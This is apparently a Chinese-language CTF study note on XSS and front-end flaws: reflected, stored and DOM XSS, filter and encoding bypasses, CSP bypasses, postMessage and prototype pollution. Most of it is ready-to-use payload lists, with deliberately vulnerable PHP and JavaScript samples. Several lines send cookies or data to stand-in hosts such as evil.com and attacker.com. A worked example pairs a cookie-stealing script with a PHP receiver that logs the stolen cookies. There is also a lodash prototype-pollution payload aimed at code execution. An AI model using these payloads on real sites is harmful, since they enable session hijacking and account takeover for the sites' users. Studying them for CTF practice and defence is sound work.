---
category: "XSS与前端安全"
tags: ["XSS", "反射型XSS", "存储型XSS", "DOM型XSS", "CSP绕过", "PostMessage", "原型链污染", "CSRF", "Payload", "前端绕过"]
difficulty: "中级"
---

# XSS与前端漏洞

## 1. 概述
跨站脚本攻击（Cross-Site Scripting, XSS）是OWASP Top 10常客。攻击者将恶意脚本注入网页，在受害者浏览器中执行，实现Cookie窃取、会话劫持、钓鱼等攻击。CTF中XSS不仅考察基本注入，更常涉及CSP绕过、DOM Clobbering、PostMessage漏洞和JavaScript原型链污染。

**核心分类：**
- **反射型XSS**：恶意脚本在HTTP响应中反射（如搜索框回显）
- **存储型XSS**：恶意脚本存储在服务器（如留言板）
- **DOM型XSS**：纯客户端漏洞（如`innerHTML`、`eval`）
- **mXSS**：变异型XSS（浏览器修正畸形HTML导致）
- **Self-XSS**：仅对自己生效（常与其他漏洞组合提权）

## 2. 核心原理

### 2.1 反射型XSS
```php
// search.php
$q = $_GET['q'];
echo "搜索结果: " . $q;   // 直接输出，未过滤
```
访问：`search.php?q=<script>alert(1)</script>` 即可触发。

### 2.2 存储型XSS
```php
// comment.php (存储)
$comment = $_POST['comment'];
$db->exec("INSERT INTO comments VALUES('$comment')");

// view.php (展示)
echo $comment_from_db;  // 未过滤输出
```

### 2.3 DOM型XSS
不经过服务端，由JavaScript操作DOM引入：
```javascript
// index.html
var pos = document.URL.indexOf("name=") + 5;
document.write(document.URL.substring(pos));
```
Payload：`index.html?name=<script>alert(1)</script>`

### 2.4 DOM Clobbering
通过HTML元素污染JavaScript全局变量。例如与`sink`结合时：
```html
<a id="someConfig" href="javascript:alert(1)">Click</a>
```
当代码使用`window.someConfig.href`时可能触发XSS。

## 3. 关键技巧/Payload

### 3.1 基础Payload集合
```html
<!-- 基本脚本标签 -->
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script src="http://evil.com/xss.js"></script>

<!-- img标签事件 -->
<img src=x onerror="alert(1)">
<img src=x onerror="fetch('http://evil.com/?c='+document.cookie)">

<!-- svg标签 -->
<svg onload="alert(1)">
<svg/onload="alert(1)">

<!-- body/input/details标签 -->
<body onload="alert(1)">
<input onfocus="alert(1)" autofocus>
<details open ontoggle="alert(1)">

<!-- iframe -->
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">

<!-- video/audio -->
<video><source onerror="alert(1)">

<!-- marquee -->
<marquee onstart="alert(1)">

<!-- object -->
<object data="javascript:alert(1)">

<!-- meta -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

<!-- select -->
<select onfocus="alert(1)" autofocus>

<!-- a标签 -->
<a href="javascript:alert(1)">click</a>
```

### 3.2 大小写/编码绕过
```html
<!-- 大小写混合 -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=X ONERROR=alert(1)>

<!-- HTML实体编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- URL编码（属性内） -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>

<!-- base64 (data: URI) -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- 16进制编码 -->
<script>eval("\x61\x6c\x65\x72\x74(1)")</script>

<!-- Unicode编码 -->
<script>eval("alert(1)")</script>

<!-- JSFuck (只用6个字符写JS) -->
<script>([][(![]+[])[+[]]...)...</script>

<!-- 反引号替代括号（部分浏览器） -->
<script>alert`1`</script>
```

### 3.3 空格/关键词过滤绕过
```html
<!-- 空格替代 -->
<img/src=x/onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
<img%0dsrc=x%0donerror=alert(1)>
<img%09src=x%09onerror=alert(1)>

<!-- onerror/alert 被过滤 -->
<svg/onload=prompt(1)>
<img src=x onerror=confirm(1)>
<img src=x onerror=top['alert'](1)>
<img src=x onerror=self['alert'](1)>
<img src=x onerror=window['\x61lert'](1)>

<!-- 使用location间接调用 -->
<script>location='javascript:alert(1)'</script>

<!-- Function构造器绕过 -->
<script>Function('alert(1)')()</script>

<!-- setTimeout/setInterval -->
<script>setTimeout('alert(1)',0)</script>
```

### 3.4 CSP绕过技巧
#### script-src限制绕过
```html
<!-- CSP: script-src 'self' -->
<!-- 1) JSONP利用（若同源有JSONP回调） -->
<script src="/api/jsonp?callback=alert(1)"></script>

<!-- 2) AngularJS环境 -->
<script src="/angular.min.js"></script>
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(1)">Click</div>
</div>

<!-- 3) 利用location进行跳转 -->
<script>
  location.href = "/redirect?url=javascript:alert(1)";
</script>
```

#### nonce绕过
```html
<!-- 若能控制nonce前的内容 -->
<style nonce=abc>...</style><script nonce=abc>alert(1)</script>
```

#### base-uri绕过
```html
<!-- CSP未限制base-uri时可劫持相对路径 -->
<base href="http://evil.com/">
<script src="/lib.js"></script>  <!-- 实际加载 http://evil.com/lib.js -->
```

#### 严格CSP下的数据外带
```html
<!-- default-src 'none'时仍可利用 -->
<!-- dns-prefetch外带 -->
<link rel="dns-prefetch" href="//evil.com/?exfil=DATA">

<!-- 利用meta refresh -->
<meta http-equiv="refresh" content="0;url=http://evil.com/?c=DATA">
```

### 3.5 PostMessage漏洞
```javascript
// 发送方：
otherWindow.postMessage('{"type":"getData"}', '*');

// 接收方（有漏洞：未验证origin）：
window.addEventListener('message', function(e) {
    // 问题：未检查 e.origin
    var data = JSON.parse(e.data);
    document.getElementById('content').innerHTML = data.content; // sink
});

// 利用页面（托管在恶意站点）：
var target = window.open('http://victim.com/page');
setTimeout(function() {
    target.postMessage('{"content":"<img src=x onerror=alert(document.domain)>"}', '*');
}, 2000);
```

### 3.6 原型链污染（Client-side Prototype Pollution）
```javascript
// 常见merge/assign操作存在漏洞
function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// 利用
// URL: /page?__proto__[isAdmin]=true
// 或 JSON输入: {"constructor":{"prototype":{"isAdmin":true}}}
```

**CTF中常见利用链：**
```javascript
// 1) 污染toString()使if语句bypass
// 2) 污染属性使权限检查为true
// 3) 污染默认选项注入危险行为
// 4) 配合模板引擎RCE
// 5) 污染XHR/fetch配置

// lodash.merge原型链污染RCE示例：
// payload: {"__proto__":{"shell":"node","env":{"NODE_OPTIONS":"--require /etc/passwd"}}}
```

## 4. 常见误区与注意事项
1. **htmlspecialchars并非万能**：`htmlspecialchars($str, ENT_QUOTES)` 无法防御属性内部的XSS（如 `<a href="javascript:...">`），需配合白名单校验。
2. **防盗链Referer**：`document.referrer` 可能为空（HTTPS→HTTP、rel=noreferrer、meta标签控制）。
3. **HttpOnly Cookie**：XSS无法读取`HttpOnly`标记的Cookie，但可利用XSS发起请求（fetch/XHR），服务端会自动携带Cookie。
4. **CSP report-uri**：攻击者可能利用CSP报告机制把数据编码在报告URL中。
5. **DOM XSS的sink**：不仅仅是`innerHTML`，`document.write()`、`eval()`、`setTimeout()`、`location`、`jQuery.html()` 等都是潜在sink。
6. **Angular/React/Vue安全性**：默认转义输出但要注意`bypassSecurityTrust*`方法、`dangerouslySetInnerHTML`、`v-html`等危险API。
7. **URL编码陷阱**：JavaScript中`decodeURIComponent`解码方式与HTML不同，可能导致绕过。
8. **offline环境建议**：提前构造好常用Payload库和编码转换脚本；了解目标浏览器/模板引擎版本特性。

## 5. 实战示例

### 示例1：留言板存储XSS + Cookie窃取
```
场景：留言板提交内容未过滤，管理员查看留言时触发。
```
**攻击端：**
```html
<!-- 留言内容 -->
<script>
var i = new Image();
i.src = 'http://attacker.com/steal.php?cookie=' + encodeURIComponent(document.cookie);
</script>
```
**接收端（steal.php）：**
```php
<?php
$cookie = $_GET['cookie'];
file_put_contents('cookies.txt', $cookie . "\n", FILE_APPEND);
?>
```

### 示例2：CSP nonce绕过
```
场景：CSP设置了nonce，但页面存在DOM XSS。
观察：每次刷新nonce值相同（静态nonce）
CSP: script-src 'nonce-abc123'
```
Payload：
```html
<!-- 利用静态nonce -->
<script nonce="abc123">alert(document.cookie)</script>
<!-- 或利用相同的nonce注入到页面已有的script标签之后 -->
```

## 6. 相关知识点
- CSRF + XSS组合利用（见09-认证鉴权与逻辑漏洞）
- WAF绕过技术（见12-WAF绕过技术汇总）
- SSTI中的JavaScript模板引擎绕过（见03-服务端模板注入SSTI）
- 文件上传中的SVG/HTML XSS（见04-文件上传漏洞）
- SSRF结合XSS盲打（见07-SSRF与XXE注入）
